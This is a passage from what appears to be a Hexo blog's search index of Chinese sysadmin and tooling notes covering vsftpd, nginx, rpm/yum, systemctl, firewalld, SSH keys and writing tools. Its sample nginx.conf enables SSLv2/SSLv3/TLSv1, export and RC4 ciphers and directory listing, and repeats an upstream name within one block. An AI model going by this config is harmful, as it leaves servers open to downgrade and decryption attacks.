9999:8080 spring-boot-docker &amp;</p></blockquote><p>如果需要部署集群，可以使用 swarm 和 kubernetes 构建弹性云系统。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://spring.io/guides/gs/spring-boot-docker/" target="_blank" rel="noopener">https://spring.io/guides/gs/spring-boot-docker/</a></li><li><a href="https://m.jb51.net/article/146105.htm" target="_blank" rel="noopener">https://m.jb51.net/article/146105.htm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CentOS 搭建 vsftp</title>
      <link href="/linux/linux/linux-vsftpd/"/>
      <url>/linux/linux/linux-vsftpd/</url>
      
        <content type="html"><![CDATA[<h2 id="安装和启动"><a href="#安装和启动" class="headerlink" title="安装和启动"></a>安装和启动</h2><p>查看是否已经安装</p><blockquote><p>rpm -q vsftpd</p></blockquote><p>“package vsftpd is not installed” 说明没有安装。</p><blockquote><p>yum  install -y  vsftpd</p></blockquote><pre><code>Installed: vsftpd.x86_64 0:3.0.2-25.elComplete!</code></pre><blockquote><p>whereis  vsftpd</p></blockquote><p>vsftpd: /usr/sbin/vsftpd /etc/vsftpd /usr/share/man/man8/vsftpd.8.gz</p><p>启动服务</p><blockquote><p>systemctl start vsftpd</p></blockquote><p>如果需要允许随系统启动的话可以使用</p><blockquote><p>systemctl enable vsftpd</p></blockquote><h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>使用 </p><blockquote><p>systemctl status vsftpd</p></blockquote><p>查看配置文件地址和安装情况。</p><pre><code>vsftpd.service - Vsftpd ftp daemon   Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; disabled; vendor preset: disabled)   Active: active (running) since Sun 2019-11-17 15:56:40 CST; 4s ago  Process: 15115 ExecStart=/usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf (code=exited, status=0/SUCCESS) Main PID: 15118 (vsftpd)   CGroup: /system.slice/vsftpd.service           └─15118 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf</code></pre><p>编辑配置文件</p><blockquote><p>vim /etc/vsftpd/vsftpd.conf</p></blockquote><p>vsftp 的匿名用户默认目录为</p><blockquote><p>/var/ftp/pub</p></blockquote><h2 id="ftp-服务需要特别开启防火墙服务"><a href="#ftp-服务需要特别开启防火墙服务" class="headerlink" title="ftp 服务需要特别开启防火墙服务"></a>ftp 服务需要特别开启防火墙服务</h2><blockquote><p>firewall-cmd –permanent –zone=public –add-service=ftp<br>firewall-cmd –reload </p></blockquote><p>通过 ftp://{host} 访问</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>几种易于管理的写作排版方案</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-tool/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-tool/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>很长一段时间，我都在探索写作的排版方案。从大学开始做校报，使用过 Word、WPS、方正飞腾等用于报纸的排版系统。</p><p>到现在互联网写作，原来的方式不再适用了，特别是</p><ul><li>不要和样式捆绑，方便多平台发布</li><li>易于版本管理，最好是文本格式</li><li>方便生成 pdf、word、html 等多种格式</li></ul><p>探索出来对于互联网写作者来说，可以采用 markdown 作为写作格式，Git 或者 SVN 作为版本管理，使用一系列工具生成各种格式发布。</p><p>我收集和整理了一些工具，用于不同的写作场景。</p><h2 id="hexo-静态网站生成"><a href="#hexo-静态网站生成" class="headerlink" title="hexo 静态网站生成"></a>hexo 静态网站生成</h2><p>如果你是一前端开发者，熟悉 npm 的使用，你可以安装好 npm 后，安装 hexo</p><blockquote><p>npm install -g hexo-cli</p></blockquote><p>然后运行</p><pre><code>$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install</code></pre><p>就能看到生成的一个项目</p><pre><code>.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes</code></pre><p>然后在 <code>source/_posts</code> 添加文档即可（也可以用命令添加）。文档头部加入一些元数据，例如标题，分类等。</p><pre><code>---title: 几种易于管理的写作排版方案categories: 写作技巧toc: true---正文</code></pre><p>最后使用命令，<code>hexo generate</code> 即可生成你想要的静态网站。</p><blockquote><p>hexo generate</p></blockquote><p>你可以参考官网文档：<a href="https://hexo.io" target="_blank" rel="noopener">https://hexo.io</a>  进行配置和使用更多命令。另外需要注意图片的问题，你可以安装一个插件即可。</p><p>插件地址：</p><p><a href="https://github.com/CodeFalling/hexo-asset-image.git" target="_blank" rel="noopener">https://github.com/CodeFalling/hexo-asset-image.git</a></p><p>我用这套东西，搭建了一个自己的知识系统，用了另外一个网友的主题，这里表示感谢：</p><p><a href="https://github.com/linksgo2011/wiki" target="_blank" rel="noopener">https://github.com/linksgo2011/wiki</a></p><h2 id="pandoc"><a href="#pandoc" class="headerlink" title="pandoc"></a>pandoc</h2><p>如果你只想简单的将 markdown 文章转成 html、pdf、epub，可以使用一个工具叫做</p><p><code>pandoc</code></p><p>使用 Mac 或者 Linux 同学可以通过编写 shell 脚本或者 Makefile 实现，对想写电子书的同学非常方便。</p><pre><code>html:     pandoc -s $(filename).md -t html5 -o index.html \        --title-prefix $(title) \        --tocepub:     pandoc -s $(filename).md --normalize --smart -t epub -o $(filename).epub --tocrtf:     pandoc -s $(filename).md -o $(filename).rtf \        --title-prefix $(title) \        --normalize \        --smartpdf:     pandoc -s $(filename).md -o $(filename).pdf \        --title-prefix $(title) \        --toc \        --latex-engine=`which xelatex`</code></pre><h2 id="gitbook"><a href="#gitbook" class="headerlink" title="gitbook"></a>gitbook</h2><p>对于没有编程经验，但是也想版本话管理自己的作品，可以使用 <a href="https://www.gitbook.com/" target="_blank" rel="noopener">https://www.gitbook.com/</a> 网上非常多的教程可以参考。</p><h2 id="Sphinx-和-LaTeX"><a href="#Sphinx-和-LaTeX" class="headerlink" title="Sphinx 和 LaTeX"></a>Sphinx 和 LaTeX</h2><p>对于专业写作者，尤其是需要编写公式的写作者。Sphinx 和 LaTeX 是非常好的一套方案。</p><ul><li>Sphinx 是一套专业的文档管理工具，很多开源软件和出版社使用这套工具</li><li>LaTeX 是一套公式编写工具，通过文本的编写格式，生成图形化的公式</li></ul><p>使用 Sphinx 的编写的文档示例参考</p><p><a href="http://www.sphinx-doc.org/en/stable/examples.html" target="_blank" rel="noopener">http://www.sphinx-doc.org/en/stable/examples.html</a></p><h2 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h2><p>还有一些资源辅助在写作过程中可能需要用到。</p><h3 id="Markdown-专用样式库"><a href="#Markdown-专用样式库" class="headerlink" title="Markdown 专用样式库"></a>Markdown 专用样式库</h3><ul><li><a href="http://markedstyle.com/styles" target="_blank" rel="noopener">http://markedstyle.com/styles</a></li></ul><h3 id="多平台文章发布器"><a href="#多平台文章发布器" class="headerlink" title="多平台文章发布器"></a>多平台文章发布器</h3><p>有一些开源的工具，但是做的都不是很好,收费的好用一点</p><ul><li>简媒 <a href="https://www.8qwe5.com" target="_blank" rel="noopener">https://www.8qwe5.com</a></li></ul><h3 id="图标库"><a href="#图标库" class="headerlink" title="图标库"></a>图标库</h3><ul><li>一套扁平的图标库资源  <a href="https://www.flaticon.com" target="_blank" rel="noopener">https://www.flaticon.com</a> </li><li>阿里的图标库 <a href="https://www.iconfont.cn/" target="_blank" rel="noopener">https://www.iconfont.cn/</a></li></ul><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><ul><li>推荐使用思源黑体,Google 开源的免费中文简体字体 <a href="https://fonts.adobe.com/fonts/source-han-sans-simplified-chinese" target="_blank" rel="noopener">https://fonts.adobe.com/fonts/source-han-sans-simplified-chinese</a></li></ul><h3 id="Markdown-Pandoc-Sphinx-Git"><a href="#Markdown-Pandoc-Sphinx-Git" class="headerlink" title="Markdown+Pandoc+Sphinx+Git"></a>Markdown+Pandoc+Sphinx+Git</h3><p>参考 Cakephp 文档 <a href="https://github.com/cakephp/docs" target="_blank" rel="noopener">https://github.com/cakephp/docs</a></p><p>使用Sphinx的文档列表<br><a href="http://www.sphinx-doc.org/en/stable/examples.html" target="_blank" rel="noopener">http://www.sphinx-doc.org/en/stable/examples.html</a></p><h3 id="HEXO-静态网站生成"><a href="#HEXO-静态网站生成" class="headerlink" title="HEXO 静态网站生成"></a>HEXO 静态网站生成</h3><p>官网：<a href="https://hexo.io" target="_blank" rel="noopener">https://hexo.io</a><br>模板根据有定制性，图片问题不好处理</p><h3 id="Markdown-GitBook-Git"><a href="#Markdown-GitBook-Git" class="headerlink" title="Markdown+GitBook+Git"></a>Markdown+GitBook+Git</h3><p>Gitbook使用教程：<a href="https://segmentfault.com/a/1190000005859901" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005859901</a></p><p>以后如果需要编辑产品文档优先使用这种方法</p><h3 id="Markdown-Pandoc-Git"><a href="#Markdown-Pandoc-Git" class="headerlink" title="Markdown+Pandoc+Git"></a>Markdown+Pandoc+Git</h3><p>这个方法更加灵活<br>参考这个项目的 Makefile</p><h2 id="Vuepress"><a href="#Vuepress" class="headerlink" title="Vuepress"></a>Vuepress</h2><p>Vuepress 是一个功能比较强大的文档生成系统，同时可以使用 vue 的一些特性，非常适合构建知识系统。</p><p>官网：<a href="https://www.vuepress.cn/" target="_blank" rel="noopener">https://www.vuepress.cn/</a></p><h2 id="docsify"><a href="#docsify" class="headerlink" title="docsify"></a>docsify</h2><p>如果不想构建静态 html 内容，而是直接渲染 markdown 可以使用 docsify，对于一些简单的文档比较实用。</p><p>官网：<a href="https://docsify.js.org/" target="_blank" rel="noopener">https://docsify.js.org/</a></p><h2 id="微信排版"><a href="#微信排版" class="headerlink" title="微信排版"></a>微信排版</h2><p><a href="https://mdnice.com/" target="_blank" rel="noopener">https://mdnice.com/</a></p><h2 id="简历排版"><a href="#简历排版" class="headerlink" title="简历排版"></a>简历排版</h2><p><a href="https://github.com/mdnice/markdown-resume" target="_blank" rel="noopener">https://github.com/mdnice/markdown-resume</a></p><h3 id="写书"><a href="#写书" class="headerlink" title="写书"></a>写书</h3><p>简单可以使用 markdown 分章节，Spring 和各种框架文档都是通过 adoc 写的，非常容易编排一本书，以及进行章节跳转。</p>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx 配置参数说明</title>
      <link href="/Nginx/nginx/ngnix-conf/"/>
      <url>/Nginx/nginx/ngnix-conf/</url>
      
        <content type="html"><![CDATA[<h2 id="一份基本的-ngnix-conf"><a href="#一份基本的-ngnix-conf" class="headerlink" title="一份基本的 ngnix.conf"></a>一份基本的 ngnix.conf</h2><pre><code>#定义Nginx运行的用户和用户组user www www;##nginx进程数,建议设置为等于CPU总核心数.worker_processes 8;##全局错误日志定义类型,[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;##进程文件pid /var/run/nginx.pid;##一个nginx进程打开的最多文件描述符数目,理论值应该是最多打开文件数（系统的值ulimit -n）与nginx进程数相除,但是nginx分配请求并不均匀,所以建议与ulimit -n的值保持一致.worker_rlimit_nofile 65535;##工作模式与连接数上限events{    #参考事件模型,use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型,如果跑在FreeBSD上面,就用kqueue模型.    use epoll;    #单个进程最大连接数（最大连接数=连接数*进程数）    worker_connections 65535;}##设定http服务器http{    include mime.types; #文件扩展名与文件类型映射表    default_type application/octet-stream; #默认文件类型    #charset utf-8; #默认编码    server_names_hash_bucket_size 128; #服务器名字的hash表大小    client_header_buffer_size 32k; #上传文件大小限制    large_client_header_buffers 4 64k; #设定请求缓    client_max_body_size 8m; #设定请求缓    # 开启目录列表访问,合适下载服务器,默认关闭.    autoindex on;                   # 显示目录    autoindex_exact_size on;        # 显示文件大小 默认为on,显示出文件的确切大小,单位是bytes 改为off后,显示出文件的大概大小,单位是kB或者MB或者GB    autoindex_localtime on;         # 显示文件时间 默认为off,显示的文件时间为GMT时间 改为on后,显示的文件时间为文件的服务器时间    sendfile on; # 开启高效文件传输模式,sendfile指令指定nginx是否调用sendfile函数来输出文件,对于普通应用设为 on,如果用来进行下载等应用磁盘IO重负载应用,可设置为off,以平衡磁盘与网络I/O处理速度,降低系统的负载.注意：如果图片显示不正常把这个改成off.    tcp_nopush on; # 防止网络阻塞    tcp_nodelay on; # 防止网络阻塞    keepalive_timeout 120; # (单位s)设置客户端连接保持活动的超时时间,在超过这个时间后服务器会关闭该链接    # FastCGI相关参数是为了改善网站的性能：减少资源占用,提高访问速度.下面参数看字面意思都能理解.    fastcgi_connect_timeout 300;    fastcgi_send_timeout 300;    fastcgi_read_timeout 300;    fastcgi_buffer_size 64k;    fastcgi_buffers 4 64k;    fastcgi_busy_buffers_size 128k;    fastcgi_temp_file_write_size 128k;    # gzip模块设置    gzip on; #开启gzip压缩输出    gzip_min_length 1k; #允许压缩的页面的最小字节数,页面字节数从header偷得content-length中获取.默认是0,不管页面多大都进行压缩.建议设置成大于1k的字节数,小于1k可能会越压越大    gzip_buffers 4 16k; #表示申请4个单位为16k的内存作为压缩结果流缓存,默认值是申请与原始数据大小相同的内存空间来存储gzip压缩结果    gzip_http_version 1.1; #压缩版本（默认1.1,目前大部分浏览器已经支持gzip解压.前端如果是squid2.5请使用1.0）    gzip_comp_level 2; #压缩等级.1压缩比最小,处理速度快.9压缩比最大,比较消耗cpu资源,处理速度最慢,但是因为压缩比最大,所以包最小,传输速度快    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型,默认就已经包含text/html,所以下面就不用再写了,写上去也不会有问题,但是会有一个warn.    gzip_vary on;#选项可以让前端的缓存服务器缓存经过gzip压缩的页面.例如:用squid缓存经过nginx压缩的数据    #开启限制IP连接数的时候需要使用    #limit_zone crawler $binary_remote_addr 10m;    ##upstream的负载均衡,四种调度算法(下例主讲)##    #虚拟主机的配置    server    {        # 监听端口        listen 80;        # 域名可以有多个,用空格隔开        server_name ably.com;        # HTTP 自动跳转 HTTPS        rewrite ^(.*) https://$server_name$1 permanent;    }    server    {        # 监听端口 HTTPS        listen 443 ssl;        server_name ably.com;        # 配置域名证书        ssl_certificate      C:\WebServer\Certs\certificate.crt;        ssl_certificate_key  C:\WebServer\Certs\private.key;        ssl_session_cache    shared:SSL:1m;        ssl_session_timeout  5m;        ssl_protocols SSLv2 SSLv3 TLSv1;        ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;        ssl_prefer_server_ciphers  on;        index index.html index.htm index.php;        root /data/www/;        location ~ .*\.(php|php5)?$        {            fastcgi_pass 127.0.0.1:9000;            fastcgi_index index.php;            include fastcgi.conf;        }        # 配置地址拦截转发，解决跨域验证问题        location /oauth/{            proxy_pass https://localhost:13580/oauth/;            proxy_set_header HOST $host;            proxy_set_header X-Real-IP $remote_addr;            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        }        # 图片缓存时间设置        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {            expires 10d;        }        # JS和CSS缓存时间设置        location ~ .*\.(js|css)?$ {            expires 1h;        }        # 日志格式设定        log_format access &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;        &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;        &#39;&quot;$http_user_agent&quot; $http_x_forwarded_for&#39;;        # 定义本虚拟主机的访问日志        access_log /var/log/nginx/access.log access;        # 设定查看Nginx状态的地址.StubStatus模块能够获取Nginx自上次启动以来的工作状态，此模块非核心模块，需要在Nginx编译安装时手工指定才能使用        location /NginxStatus {            stub_status on;            access_log on;            auth_basic &quot;NginxStatus&quot;;            auth_basic_user_file conf/htpasswd;            #htpasswd文件的内容可以用apache提供的htpasswd工具来产生.        }    }}</code></pre><h2 id="负载均衡配置"><a href="#负载均衡配置" class="headerlink" title="负载均衡配置"></a>负载均衡配置</h2><pre><code>events{    use epoll;    worker_connections 65535;}http{    ##upstream的负载均衡,四种调度算法##    #调度算法1:轮询.每个请求按时间顺序逐一分配到不同的后端服务器,如果后端某台服务器宕机,故障系统被自动剔除,使用户访问不受影响    upstream webhost {        server 192.168.0.5:6666 ;        server 192.168.0.7:6666 ;    }    #调度算法2:weight(权重).可以根据机器配置定义权重.权重越高被分配到的几率越大    upstream webhost {        server 192.168.0.5:6666 weight=2;        server 192.168.0.7:6666 weight=3;    }    #调度算法3:ip_hash. 每个请求按访问IP的hash结果分配,这样来自同一个IP的访客固定访问一个后端服务器,有效解决了动态网页存在的session共享问题    upstream webhost {        ip_hash;        server 192.168.0.5:6666 ;        server 192.168.0.7:6666 ;    }    #调度算法4:url_hash(需安装第三方插件).此方法按访问url的hash结果来分配请求,使每个url定向到同一个后端服务器,可以进一步提高后端缓存服务器的效率.Nginx本身是不支持url_hash的,如果需要使用这种调度算法,必须安装Nginx 的hash软件包    upstream webhost {        server 192.168.0.5:6666 ;        server 192.168.0.7:6666 ;        hash $request_uri;    }    #调度算法5:fair(需安装第三方插件).这是比上面两个更加智能的负载均衡算法.此种算法可以依据页面大小和加载时间长短智能地进行负载均衡,也就是根据后端服务器的响应时间来分配请求,响应时间短的优先分配.Nginx本身是不支持fair的,如果需要使用这种调度算法,必须下载Nginx的upstream_fair模块    #    #虚拟主机的配置(采用调度算法3:ip_hash)    server    {        listen  80;        server_name  mongo.demo.com;        #对 &quot;/&quot; 启用反向代理        location / {            proxy_pass http://webhost;            proxy_redirect off;            proxy_set_header X-Real-IP $remote_addr;            #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;            #以下是一些反向代理的配置,可选.            proxy_set_header Host $host;            client_max_body_size 10m; #允许客户端请求的最大单文件字节数            client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数,            proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时)            proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时)            proxy_read_timeout 90; #连接成功后,后端服务器响应时间(代理接收超时)            proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小            proxy_buffers 4 32k; #proxy_buffers缓冲区,网页平均在32k以下的设置            proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2）            proxy_temp_file_write_size 64k;            #设定缓存文件夹大小,大于这个值,将从upstream服务器传        }    }}</code></pre><p>一份 ip_hash 的配置文件</p><pre><code># 创建文件夹准备存放配置文件$ mkdir -p /opt/confs$ vim /opt/confs/nginx.conf# 编辑内容如下：events{  use epoll;  worker_connections 65535;}http{    upstream webhost {        ip_hash;        server 192.168.0.5:6666 ;        server 192.168.0.7:6666 ;    }    server    {        listen  80;        server_name  mongo.demo.com;        location / {            proxy_pass http://webhost;            proxy_redirect off;            proxy_set_header X-Real-IP $remote_addr;            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;            proxy_set_header Host $host;            client_max_body_size 10m;            client_body_buffer_size 128k;            proxy_connect_timeout 90;            proxy_send_timeout 90;            proxy_read_timeout 90;            proxy_buffer_size 4k;            proxy_buffers 4 32k;            proxy_busy_buffers_size 64k;            proxy_temp_file_write_size 64k;        }    }}# 然后保存并退出# 启动负载均衡服务器192.168.0.4（Nginx-Server）docker run -d -p 8888:80 --name nginx-server -v /opt/confs/nginx.conf:/etc/nginx/nginx.conf --restart always nginx</code></pre><blockquote><p>动态更新 upstream 需要配合 Consul 作为服务注册和发现系统完成。</p></blockquote><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li><a href="https://blog.csdn.net/jek123456/article/details/68059358" target="_blank" rel="noopener">https://blog.csdn.net/jek123456/article/details/68059358</a></li><li><a href="https://segmentfault.com/a/1190000005789137" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005789137</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>rpm 和 yum 包管理器的使用</title>
      <link href="/linux/linux/linux-rpm-installation/"/>
      <url>/linux/linux/linux-rpm-installation/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>rpm 是 RedHat 的包管理工具，因此叫 RedHat Package Manager，但由于目前 rpm 非常流行，基本上已经是事实标准。</p><p>rpm 包适用于 Fedora, CentOS, Red Hat Enterprise Linux, OpenSUSE, Mandriva, PCLinuxOS 等操作系。和 rpm 类似的是 deb 包。</p><p>尤其是 CentOS 用的比较多, rpm 比较有用。另外在 CentOS 有另外一个工具 yum。</p><ul><li>rpm，底层工具用来安装和删除软件包文件</li><li>yum，上层工具完成元数据搜索和依赖解析</li></ul><p>两种工具都可以，完成软件的安装。</p><blockquote><p>yum install package_name<br>rpm -i package_file</p></blockquote><p>不同之处在于，rpm 需要自己下载软件包并且安装，如果依赖不满足可能报错。yum 会从资源库（repo）中搜索安装，并自动解决依赖问题。</p><h2 id="推荐的安装方式"><a href="#推荐的安装方式" class="headerlink" title="推荐的安装方式"></a>推荐的安装方式</h2><p>所以我们一般使用 yum 安装，如果资源库中没有，软件的官网往往提供了 repo，我们可以导入然后使用 yum 安装。</p><p>Jenkins 的安装页面，提供如下的安装方式</p><p>下载 repo 描述文件</p><blockquote><p>sudo wget -O /etc/yum.repos.d/jenkins.repo <a href="https://pkg.jenkins.io/redhat-stable/jenkins.repo" target="_blank" rel="noopener">https://pkg.jenkins.io/redhat-stable/jenkins.repo</a></p></blockquote><p>导入 repo 信息</p><blockquote><p>sudo rpm –import <a href="https://pkg.jenkins.io/redhat-stable/jenkins.io.key" target="_blank" rel="noopener">https://pkg.jenkins.io/redhat-stable/jenkins.io.key</a></p></blockquote><p>使用 yum 安装</p><blockquote><p>yum install jenkins</p></blockquote><p>我们在编写安装脚本的时候，推荐使用这种安装方式，基本上能解决大部分的软件安装，又容易管理。</p><p><a href="https://pkg.jenkins.io/redhat-stable/" target="_blank" rel="noopener">https://pkg.jenkins.io/redhat-stable/</a></p><h2 id="Linux-包安装方式"><a href="#Linux-包安装方式" class="headerlink" title="Linux 包安装方式"></a>Linux 包安装方式</h2><ul><li>yum，默认仓库有安装包时</li><li>yum + rpm，软件包提供了自己的 repo 时</li><li>rpm，找不到 repo 时</li><li>源代码编译或使用通用二进制方式</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Intellij 常用技巧</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/idea-skills/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/idea-skills/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-Hierarchy-分析类的关系"><a href="#使用-Hierarchy-分析类的关系" class="headerlink" title="使用 Hierarchy 分析类的关系"></a>使用 Hierarchy 分析类的关系</h2><p>我们用工具 IntelliJ IDEA， 打开任意类，单击 Navigate → Type Hierarchy。然后我们会得到下面视图。</p><p><img src="/开发工具/tool/idea-skills/idea-hierarchy.jpg" alt="Hierarchy"></p><p>使用 Hierarchy 对我们分析源码有非常大的帮助。</p><h2 id="使用-Diagrams-查看类图"><a href="#使用-Diagrams-查看类图" class="headerlink" title="使用 Diagrams 查看类图"></a>使用 Diagrams 查看类图</h2><p>使用工具 Intellij IDEA，打开任意类（有复杂继承关系的类或者接口），在文件上右击，选择 show diagrams，可以看到类的关系层次。这里以 CurdRepository 为例，显示类图如下。</p><p><img src="/开发工具/tool/idea-skills/idea-diagram.png" alt="类图"></p><h2 id="查看子类（实现类）类图"><a href="#查看子类（实现类）类图" class="headerlink" title="查看子类（实现类）类图"></a>查看子类（实现类）类图</h2><p><img src="/开发工具/tool/idea-skills/image-20200406094512355.png" alt="image-20200406094512355"></p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>系统服务管理 systemctl</title>
      <link href="/linux/linux/linux-systemctl/"/>
      <url>/linux/linux/linux-systemctl/</url>
      
        <content type="html"><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>systemctl 设计目标是为系统的启动和管理提供一套完整的解决方案。</p><h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><p>查看版本号 </p><blockquote><p>systemctl –version</p></blockquote><p>管理系统</p><pre><code># 重启系统$ sudo systemctl reboot# 关闭系统，切断电源$ sudo systemctl poweroff# CPU停止工作$ sudo systemctl halt# 暂停系统$ sudo systemctl suspend# 让系统进入冬眠状态$ sudo systemctl hibernate# 让系统进入交互式休眠状态$ sudo systemctl hybrid-sleep# 启动进入救援状态（单用户状态）$ sudo systemctl rescue</code></pre><p>  管理服务 (平时用的最多的)</p><pre><code># 立即启动一个服务$ sudo systemctl start apache.service# 立即停止一个服务$ sudo systemctl stop apache.service# 重启一个服务$ sudo systemctl restart apache.service# 杀死一个服务的所有子进程$ sudo systemctl kill apache.service# 重新加载一个服务的配置文件$ sudo systemctl reload apache.service# 重载所有修改过的配置文件$ sudo systemctl daemon-reload# 显示某个 Unit 的所有底层参数$ systemctl show httpd.service# 显示某个 Unit 的指定属性的值$ systemctl show -p CPUShares httpd.service# 设置某个 Unit 的指定属性$ sudo systemctl set-property httpd.service CPUShares=500</code></pre><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>防火墙暴露端口</title>
      <link href="/linux/linux/linux-fire-wall/"/>
      <url>/linux/linux/linux-fire-wall/</url>
      
        <content type="html"><![CDATA[<h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><p>开启端口 </p><blockquote><p>sudo firewall-cmd –zone=public –add-port=80/tcp –permanent</p></blockquote><p>命令含义：</p><p>–zone #作用域</p><p>–add-port=80/tcp  #添加端口，格式为：端口/通讯协议</p><p>–permanent  #永久生效，没有此参数重启后失效</p><p>重启防火墙 </p><blockquote><p>sudo firewall-cmd –reload</p></blockquote><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li><a href="https://blog.csdn.net/qq_27870421/article/details/93165382" target="_blank" rel="noopener">https://blog.csdn.net/qq_27870421/article/details/93165382</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用和生成 SSH key 登录 Linux 服务器</title>
      <link href="/linux/linux/linux-gen-ssh-key/"/>
      <url>/linux/linux/linux-gen-ssh-key/</url>
      
        <content type="html"><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>基本原理为服务器持有公钥，客户端持有私钥。服务器 authorized_keys 中允许添加多个公钥，则允许多个持有私钥的客户端登陆上来。客户端生成密匙对，然后讲公钥文件注册到 authorized_keys 即可登录。</p><h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><p>在客户端打开控制台，输入命令</p><blockquote><p>ssh-keygen -t rsa</p></blockquote><p>Enter file in which to save the key (/home/hp/.ssh/id_rsa): </p><p>输入生成 key 的位置</p><p>选择默认选项的话，可以在指定的位置得到 id_rsa  id_rsa.pub 两个文件。<br>，id_rsa 私钥，id_rsa.pub 为公钥，公钥为服务器持有，私钥为客户端登录上来的凭证。</p><p>需要把公钥添加到系统的密匙文件中，才能启用公钥。</p><blockquote><p>cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys </p></blockquote><p>完成上面的步骤后，即可使用下面的命令登录：</p><blockquote><p>ssh -i id_rsa username@host</p></blockquote><p>注意</p><ul><li>如果密匙对是在服务器上生成的，可以吧 id_rsa 文件拷贝到本机 ./ssh/ 下即可登录。</li><li>如果本机已经存在 id_rsa 文件，为了不影响登录其他服务，可以直接把存在的 id_rsa.pub 拷贝到 authorized_keys 即可登录。</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux 虚拟机管理 Vagrant</title>
      <link href="/linux/linux/vagrant/"/>
      <url>/linux/linux/vagrant/</url>
      
